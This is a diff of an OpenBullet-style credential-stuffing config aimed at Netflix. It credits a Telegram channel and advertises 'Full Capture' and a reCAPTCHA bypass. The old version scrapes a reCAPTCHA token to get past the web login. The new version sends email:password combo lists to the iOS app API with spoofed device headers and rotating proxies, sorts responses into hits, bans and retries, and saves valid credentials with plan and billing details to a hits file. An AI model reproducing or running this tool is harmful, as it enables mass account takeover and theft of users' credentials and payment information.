@@ -3,8 +3,8 @@
   "Name": "Netflix",
   "SuggestedBots": 100,
   "MaxCPM": 0,
-  "LastModified": "2020-12-19T23:56:06.9934219+03:30",
-  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Needs HQ Proxy | ReCaptcha Bypassed | Full Capture | CPM Rate: 20-500",
+  "LastModified": "2020-09-13T17:18:15.217975+04:30",
+  "AdditionalInfo": "Telegram Channel: @BruteForce | Full Capture | Save Hits txt File | API IOS | CPM Rate: 20-500",
   "RequiredPlugins": [],
   "Author": "@TheOwn",
   "Version": "1.2.2",
@@ -16,8 +16,8 @@
   "NeedsProxies": true,
   "OnlySocks": false,
   "OnlySsl": false,
-  "MaxProxyUses": 0,
-  "BanProxyAfterGoodStatus": false,
+  "MaxProxyUses": 30,
+  "BanProxyAfterGoodStatus": true,
   "BanLoopEvasionOverride": -1,
   "EncodeData": false,
   "AllowedWordlist1": "MailPass",
@@ -35,69 +35,43 @@
 }
 
 [SCRIPT]
-#Get1 REQUEST GET "https://www.netflix.com/Login" 
-  
-  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
-  HEADER "Pragma: no-cache" 
-  HEADER "Accept: */*" 
+#RAND FUNCTION RandomString "?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m" -> VAR "RAND" 
 
-KEYCHECK BanOnToCheck=FALSE 
-  KEYCHAIN Ban OR 
-    KEY "Sorry, we&#39;re having trouble with your request. You&#39;ll find lots to explore on the home page." 
+#KIR FUNCTION URLEncode "NFAPPL-02-IPHONE7=2-<RAND>" -> VAR "KIR" 
 
-#AuthURL PARSE "<SOURCE>" LR "authURL\" value=\"" "\"/" -> VAR "AuthURL" 
+#ENC FUNCTION URLEncode "{\"action\":\"loginAction\",\"fields\":{\"userLoginId\":\"<USER>\",\"rememberMe\":\"true\",\"password\":\"<PASS>\"},\"verb\":\"POST\",\"mode\":\"login\",\"flow\":\"appleSignUp\"}" -> VAR "ENC" 
 
-#Auth FUNCTION URLEncode "<AuthURL>" -> VAR "Auth" 
+#Lenght FUNCTION Length "appInternalVersion=11.44.0&appVersion=11.44.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22clipsEnabled%22%3A%22false%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22seasonRenewalPostPlayEnabled%22%3A%22true%22%2C%22previewsBrandingEnabled%22%3A%22true%22%2C%22aroGalleriesEnabled%22%3A%22true%22%2C%22interactiveFeatureSugarPuffsEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22searchImageLocalizationFallbackLocales%22%3Atrue%2C%22billboardEnabled%22%3A%22true%22%2C%22searchImageLocalizationOnResultsOnly%22%3A%22false%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22characterBarOnPhoneEnabled%22%3A%22false%22%2C%22contentWarningEnabled%22%3A%22true%22%2C%22bigRowEnabled%22%3A%22true%22%2C%22interactiveFeatureAppUpdateDialogueEnabled%22%3A%22false%22%2C%22familiarityUIEnabled%22%3A%22false%22%2C%22bigrowNewUIEnabled%22%3A%22false%22%2C%22interactiveFeatureSugarPuffsPreplayEnabled%22%3A%22true%22%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22motionCharacterEnabled%22%3A%22true%22%2C%22roarEnabled%22%3A%22true%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22mobileCollectionsEnabled%22%3A%22false%22%2C%22interactiveFeatureMinecraftEnabled%22%3A%22true%22%2C%22searchImageLocalizationEnabled%22%3A%22false%22%2C%22interactiveFeatureKimmyEnabled%22%3A%22true%22%2C%22interactiveFeatureYouVsWildEnabled%22%3A%22true%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22kidsTrailers%22%3Atrue%7D&device_type=NFAPPL-02-&esn=<KIR>&idiom=phone&iosVersion=12.4.3&isTablet=false&kids=false&maxDeviceWidth=375&method=call&model=saget&modelType=IPHONE7-2&odpAware=true&param=<ENC>&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json" -> VAR "Lenght" 
 
-#Get2 REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&v=Y5tQ3lKwn1XL5hGgLz1kR4-1&size=invisible&cb=cpphtg1lth6a" 
-  
-  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
-  HEADER "Pragma: no-cache" 
-  HEADER "Accept: */*" 
-
-#C PARSE "<SOURCE>" LR "type=\"hidden\" id=\"recaptcha-token\" value=\"" "\">" -> VAR "C" 
-
-#Recaptcha REQUEST POST "https://www.google.com/recaptcha/api2/reload?k=6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR" 
-  CONTENT "v=Y5tQ3lKwn1XL5hGgLz1kR4-1&reason=q&c=<C>" 
+#Post REQUEST POST "https://ios.prod.ftl.netflix.com/iosui/user/11.44" 
+  CONTENT "appInternalVersion=11.44.0&appVersion=11.44.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22clipsEnabled%22%3A%22false%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22seasonRenewalPostPlayEnabled%22%3A%22true%22%2C%22previewsBrandingEnabled%22%3A%22true%22%2C%22aroGalleriesEnabled%22%3A%22true%22%2C%22interactiveFeatureSugarPuffsEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22searchImageLocalizationFallbackLocales%22%3Atrue%2C%22billboardEnabled%22%3A%22true%22%2C%22searchImageLocalizationOnResultsOnly%22%3A%22false%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22characterBarOnPhoneEnabled%22%3A%22false%22%2C%22contentWarningEnabled%22%3A%22true%22%2C%22bigRowEnabled%22%3A%22true%22%2C%22interactiveFeatureAppUpdateDialogueEnabled%22%3A%22false%22%2C%22familiarityUIEnabled%22%3A%22false%22%2C%22bigrowNewUIEnabled%22%3A%22false%22%2C%22interactiveFeatureSugarPuffsPreplayEnabled%22%3A%22true%22%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22motionCharacterEnabled%22%3A%22true%22%2C%22roarEnabled%22%3A%22true%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22mobileCollectionsEnabled%22%3A%22false%22%2C%22interactiveFeatureMinecraftEnabled%22%3A%22true%22%2C%22searchImageLocalizationEnabled%22%3A%22false%22%2C%22interactiveFeatureKimmyEnabled%22%3A%22true%22%2C%22interactiveFeatureYouVsWildEnabled%22%3A%22true%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22kidsTrailers%22%3Atrue%7D&device_type=NFAPPL-02-&esn=<KIR>&idiom=phone&iosVersion=12.4.3&isTablet=false&kids=false&maxDeviceWidth=375&method=call&model=saget&modelType=IPHONE7-2&odpAware=true&param=<ENC>&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json" 
   CONTENTTYPE "application/x-www-form-urlencoded" 
-  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
-  HEADER "Pragma: no-cache" 
+  HEADER "Host: ios.prod.ftl.netflix.com" 
+  HEADER "X-Netflix.Argo.abTests: " 
+  HEADER "X-Netflix.client.appVersion: 11.44.0" 
   HEADER "Accept: */*" 
-
-#Token PARSE "<SOURCE>" LR "[\"rresp\",\"" "\"" -> VAR "Token" 
-
-#US FUNCTION URLEncode "<USER>" -> VAR "US" 
-
-#PS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
-
-#Length FUNCTION Length "userLoginId=<US>&password=<PS>&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=rememberMe%2CnextPage%2CuserLoginId%2Cpassword%2CcountryCode%2CcountryIsoCode%2CrecaptchaResponseToken%2CrecaptchaError%2CrecaptchaResponseTime&authURL=<Auth>&nextPage=&showPassword=&countryCode=%2B1&countryIsoCode=CA&recaptchaResponseToken=<Token>&recaptchaResponseTime=1034" -> VAR "Length" 
-
-#Login REQUEST POST "https://www.netflix.com/Login" 
-  CONTENT "userLoginId=<US>&password=<PS>&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=rememberMe%2CnextPage%2CuserLoginId%2Cpassword%2CcountryCode%2CcountryIsoCode%2CrecaptchaResponseToken%2CrecaptchaError%2CrecaptchaResponseTime&authURL=<Auth>&nextPage=&showPassword=&countryCode=%2B1&countryIsoCode=CA&recaptchaResponseToken=<Token>&recaptchaResponseTime=1034" 
-  CONTENTTYPE "application/x-www-form-urlencoded" 
-  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
-  HEADER "Accept-Encoding: gzip, deflate, br" 
-  HEADER "Accept-Language: en-US,en;q=0.9" 
-  HEADER "Cache-Control: max-age=0" 
-  HEADER "Connection: keep-alive" 
-  HEADER "Content-Length: <Length>" 
-  HEADER "Host: www.netflix.com" 
-  HEADER "Origin: https://www.netflix.com" 
-  HEADER "Referer: https://www.netflix.com/Login" 
-  HEADER "Sec-Fetch-Dest: document" 
-  HEADER "Sec-Fetch-Mode: navigate" 
-  HEADER "Sec-Fetch-Site: same-origin" 
-  HEADER "Sec-Fetch-User: ?1" 
-  HEADER "Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
+  HEADER "X-Netflix.Argo.NFNSM: 9" 
+  HEADER "Accept-Language: en-US;q=1, fa-UK;q=0.9, en-UK;q=0.8, ar-UK;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Netflix.Request.Attempt: 1" 
+  HEADER "X-Netflix.client.idiom: phone" 
+  HEADER "X-Netflix.Request.Routing: {\"path\":\"/nq/iosui/argo/~11.44.0/user\",\"control_tag\":\"iosui_argo_non_member\"}" 
+  HEADER "User-Agent: Argo/11.44.0 (iPhone; iOS 12.4.3; Scale/2.00)" 
+  HEADER "X-Netflix.client.type: argo" 
+  HEADER "Content-Length: <Lenght>" 
+  HEADER "Connection: close" 
+  HEADER "X-Netflix.client.iosVersion: 12.4.3" 
 
 KEYCHECK 
   KEYCHAIN Failure OR 
-    KEY "Sorry, we can't find an account with this email address." 
-    KEY "Incorrect password." 
+    KEY "\"value\":\"incorrect_password\"}," 
+    KEY "unrecognized_email_consumption_only" 
   KEYCHAIN Success OR 
-    KEY "profile-name" 
-  KEYCHAIN Custom "FREE" OR 
-    KEY "Welcome back" 
+    KEY "memberHome" 
+  KEYCHAIN Ban OR 
+    KEY "login_error_consumption_only" 
+  KEYCHAIN Retry OR 
+    KEY "throttling_failure" 
 
 #Cookie PARSE "<SOURCE>" LR "\"flwssn\":\"" "\"" -> VAR "Cookie" 
 
@@ -148,7 +122,7 @@ KEYCHECK
 
 #Billing PARSE "<SOURCE>" LR "data-uia=\"payment-text\">" "</span" CreateEmpty=FALSE -> CAP "Payment Methode" 
 
-#Credit FUNCTION Constant " T.me/BruteForce " -> CAP " Telegram Channel:" 
+#CC FUNCTION Constant "@BruteForce " -> CAP " Telegram Channel: " 
 
-#SSS UTILITY File "Netflix Hits.txt" AppendLines "<<<<<<=Account=>>>>>>\\nCombo: <USER>:<PASS>\\nEmail:  <USER>\\nPassword: <PASS>\\n<<<<<<<<<<<=Information=>>>>>>>>>>\\nPlan: <Plan>\\nPeriod Of Time: <Period Of Time>\\nCountry: <Country>\\nFree Trial: <Trial>\\nDVD: <DVD>\\nMax Streams: <Stream>\\nHas HD: <HD>\\nHas Ultra HD: <Ultra HD>\\nPayment Methode: <Payment Methode>\\nNext Billing Date: <Next Billing>\\n\\n\\n<<<<<<=Credit=>>>>>>\\nConfiged By @TheOwn\\nTelegram Channel: @BruteForce\\n=================================================" -> VAR "Save" 
+#SSS UTILITY File "Netflix Hits.txt" AppendLines "<<<<<<=Account=>>>>>>\\nCombo: <USER>:<PASS>\\nEmail:  <USER>\\nPassword: <PASS>\\n<<<<<<<<<<<=Information=>>>>>>>>>>\\nPlan: <Plan>\\nPeriod Of Time: <Period Of Time>\\nCountry: <Country>\\nFree Trial: <Trial>\\nDVD: <DVD>\\nMax Streams: <Stream>\\nHas HD: <HD>\\nHas Ultra HD: <Ultra HD>\\nPayment Methode: <Payment Methode>\\nNext Billing Date: <Next Billing>\\n\\n<<<<<<=Credit=>>>>>>\\nConfiged By @TheOwn | Telegram Channel: T.me/BruteForce \\n=================================================" -> VAR "Save" 
 
